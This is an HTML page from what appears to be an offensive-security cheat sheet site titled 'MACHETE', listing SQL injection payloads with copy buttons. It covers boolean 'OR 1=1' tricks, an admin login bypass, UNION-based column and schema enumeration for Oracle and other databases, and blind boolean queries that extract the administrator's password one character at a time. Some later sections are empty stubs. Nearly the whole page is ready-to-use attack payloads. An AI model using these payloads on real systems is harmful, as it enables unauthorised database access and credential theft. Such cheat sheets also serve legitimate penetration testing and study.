<!DOCTYPE html>
<html lang="en-US">

<head>
	<link rel="icon" type="image/x-icon" href="https://gitlab.com/uploads/-/system/project/avatar/40927563/edb-spider-orange.png">
	<link rel="stylesheet" type="text/css" href="/machete/conf/machete_style_offensive_sections.css">
	
	<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.1/jquery.min.js"></script>
	<script>
		function ctrl_C(element) {
  		var $temp = $("<input>");
  		$("body").append($temp);
  		$temp.val($(element).text()).select();
  		document.execCommand("copy");
  		$temp.remove();
	}
	</script>

  <title> M A C H E T E </title>
  <!--------------------->
  <!-- b0ydC Founder -->
  <!-- --------------- -->
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta charset="utf-8" />

</head>
<body>
<pre><center>
<a href="/machete/index.html" style="text-decoration:none;">

   ▄▄▄▄███▄▄▄▄      ▄████████  ▄████████    ▄█    █▄       ▄████████     ███        ▄████████ 
 ▄██▀▀▀███▀▀▀██▄   ███    ███ ███    ███   ███    ███     ███    ███ ▀█████████▄   ███    ███ 
 ███   ███   ███   ███    ███ ███    █▀    ███    ███     ███    █▀     ▀███▀▀██   ███    █▀  
 ███   ███   ███   ███    ███ ███         ▄███▄▄▄▄███▄▄  ▄███▄▄▄         ███   ▀  ▄███▄▄▄     
 ███   ███   ███ ▀███████████ ███        ▀▀███▀▀▀▀███▀  ▀▀███▀▀▀         ███     ▀▀███▀▀▀     
 ███   ███   ███   ███    ███ ███    █▄    ███    ███     ███    █▄      ███       ███    █▄  
 ███   ███   ███   ███    ███ ███    ███   ███    ███     ███    ███     ███       ███    ███ 
  ▀█   ███   █▀    ███    █▀  ████████▀    ███    █▀      ██████████    ▄████▀     ██████████ 
                                                                                              
                                      
</a></pre>
<div style="font-size:24px; text-align:center; font-family:courier,monospace;">
    <a href="/machete/offensive.html">OFFENSIVE</a> |
    <a href="/machete/defensive.html">DEFENSIVE</a> |
    <a href="/machete/tools.html">TOOLS</a> |
    <a href="/machete/about.html">ABOUT</a> 
</div> 

<p class="titulos"><mark>[SQL INJECTION]</mark></p>
<div>
<button onclick="document.location='/machete/offensive/web_penetration_testing/server_side_attacks.html'">GO BACK</button>
<pre><div class="column" style="display: inline-block; text-align: left; background-color:gray;">
<details>
<summary>HIDDEN DATA TECHNIQUES</summary>
<p><b>DESCRIPTION:</b> It will use some boolean conditions in order to retrieve content from the database.

If the vulnerability is present the goal is to "cut" the query and retrieve all, for that boolean conditions are used.
	
<p><p id="HDT01"><mark>' OR 1=1--</mark></p>
<p id="HDT02"><mark>' and 'a'='a--</mark></p>
<p id="HDT03"><mark>' and 1=2;--</mark></p></p>
	
<button onclick="ctrl_C('#HDT01')">C01</button> | <button onclick="ctrl_C('#HDT02')">C02</button> | <button onclick="ctrl_C('#HDT03')">C03</button></p>
</details>
<details>
<summary>LOGIN BYPASS TECHNIQUES</summary>
<p><b>DESCRIPTION:</b> It is used to bypass login forms, guessing users or after collecting some of them.

Sample:

<mark>administrator'--</mark>

</p>
</details>
<details>
<summary>DATABASE TYPE/VERSION/NUMBER TECHNIQUES</summary>
<p><b>DESCRIPTION:</b> Techniques used to retrieve the database version.

<b>--</b> or <b>#</b> | It is used in SQL query language to comment out ignoring the rest of the query.

<b>PRE-REQS:</b>
1. get column number
<b>method1:</b><mark>' ORDER BY 1--</mark>
<b>method2:</b><mark>' UNION SELECT NULL--</mark>
	
2. get field type
<mark>' UNION SELECT 'a',NULL,NULL,NULL--</mark>* assuming four columns
<mark>' UNION SELECT NULL,'a',NULL,NULL--</mark>
<mark>' UNION SELECT 'a','a' FROM DUAL--</mark>* assuming two columns
	
<b>NOTE:</b> It is needed to be iterative so you can find the right field type. For that number of columns
is needed. Also, for ORACLE the select statement is needed a table to search from, it can be any table.
	
<b>COMMON TESTS:</b>

<b>ORACLE:</b><mark>' UNION SELECT 'a','a' FROM DUAL--</mark> | <mark>' UNION SELECT banner,NULL FROM v$version--</mark>
*assuming it has two columns and both are type string.

<b>MYSQL | SQL:</b> <mark>' UNION SELECT @@version,NULL#</mark>
*assuming it has two columns and first is type string.
	
<b>POSTGRESQL:</b></p>
</details>
<details>
<summary>LISTING DATABASE CONTENT TECHNIQUES</summary>
<p><b>DESCRIPTION:</b> Used to retrieve the name of table, columns, etc. to retrieve content from database. 
<details>
<summary>NON-ORACLE</summary>
<b>PRE-REQS:</b>
1. get column number
2. get field type

*after that information is collected, it is time to retrieve the TABLE_NAME of the database schema.

<mark>' UNION SELECT table_name,NULL from information_schema.tables--</mark>

*once table is identified, it is time to retrieve the COLUMNS of the table

<mark>' UNION SELECT column_name,NULL from information_schema.columns WHERE table_name='TABLE_NAME'--</mark>

*once table_name and columns are identified, it is time to retrieve the CONTENT

<mark>' UNION SELECT column_name1,column_name2 FROM TABLE_NAME--</mark>

</details>
<details>
<summary>ORACLE</summary>
<b>PRE-REQS:</b>
1. get column number
2. get field type

*after that information is collected, it is time to retrieve the TABLE_NAME of the database schema.

<mark>' UNION SELECT table_name,NULL from ALL_TABLES--</mark>

*once table is identified, it is time to retrieve the COLUMNS of the table

<mark>' UNION SELECT column_name,NULL from all_tab_columns WHERE table_name='TABLE_NAME'--</mark>

*once table_name and columns are identified, it is time to retrieve the CONTENT

<mark>' UNION SELECT column_name1,column_name2 FROM TABLE_NAME--</mark>	
</details>

<b>NOTE:</b> both ways needs to know the column number, field type and both examples are assuming it has
two columns and both type string.</p>
</details>
<details>
<summary>UNION ATTACKS TECHNIQUES</summary>
<p><b>DESCRIPTION:</b> If the vulnerability is present, UNION attacks can be used to retrieve content
from other tables.

STEP1: get query columns number

<mark>' UNION SELECT NULL--</mark>
*add null values until the error disappears

STEP2: get column field type

<mark>' UNION SELECT NULL,'a'--</mark> | non-oracle
<mark>' UNION SELECT 'a','a' FROM DUAL--</mark> | oracle
*assuming two columns

... after those steps, please refer to LISTING DATABASE CONTENT TECHNIQUES, it will apply the same. </p>
</details>
<details>
<summary>BLIND ATTACKS TECHNIQUES</summary>
<p><b>DESCRIPTION:</b> Simple boolean conditions can help to detect how different the site behaves. 
Look for any new behavior after small changes.
<details>
<summary>CONDITIONAL RESPONSES</summary>
	
<mark>' AND '1'='1</mark> TRUE
<mark>' AND '1'='2</mark> FALSE

To successfully acomplish the blind attack, the boolean conditions can help. It is matter of what to ask.

> <u>check if table exist ?</u>
<mark>' AND (SELECT 'a' FROM TABLE_NAME LIMIT 1)='a</mark> | TRUE condition means table exist !

> <u>check if column value exist ?</u>
<mark>' AND (SELECT 'a' FROM TABLE_NAME WHERE COLUMN_NAME='VALUE')='a</mark> | TRUE condition means column value exist !
<mark>' AND (SELECT 'a' FROM users WHERE username='administrator')='a</mark>

> <u>check the character lenght of the column ?</u>
<mark>' AND (SELECT 'a' FROM TABLE_NAME WHERE COLUMN_NAME='VALUE' AND LENGTH(COLUMN_NAME)>1)='a</mark>	
<mark>' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a</mark>

<b>Note:</b> Here a series of incremental query's working with the TRUE statement are needed, once the number reached 
hits the FALSE statement.

> <u>check the characters of the column ?</u>
<mark>' AND (SELECT SUBSTRING(COLUMN_NAME,1,1) FROM TABLE_NAME WHERE COLUMN_NAME='VALUE')='§a§</mark>
<mark>' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='§a§</mark>

So, it is the same as saying, first character in the value of column_name X is equal to "A". We need to
iterate more times with each letter, number, etc. For that reason a pre-req is to know the value lenght. 

<u>CLUSTER BOMB ATTACK !</u> - two positions

<mark>' AND (SELECT SUBSTRING(COLUMN_NAME,<b>§1§</b>,1) FROM TABLE_NAME WHERE COLUMN_NAME='VALUE')='<b>§a§</b></mark>

<b>Note:</b> Remember the TRUE/FALSE logic and the response associated to that. That will help to know which 
values are correct = TRUE. 
</details>
<details>
<summary>CONDITIONAL ERRORS</summary>

</details>	
</p>
</details>
<details>
<summary>ERROR-BASED TECHNIQUES</summary>
<p><b>DESCRIPTION: </b></p>
</details>
<details>
<summary>ENCODING ATTACK TECHNIQUES</summary>
<p><b>DESCRIPTION: </b></p>
</details>
</div>
</pre>
<button onclick="document.location='/machete/offensive/web_penetration_testing/server_side_attacks.html'">GO BACK</button>
</div>
<p class="titulos">©® - 2023.</p>
</center>
</body>
</html>
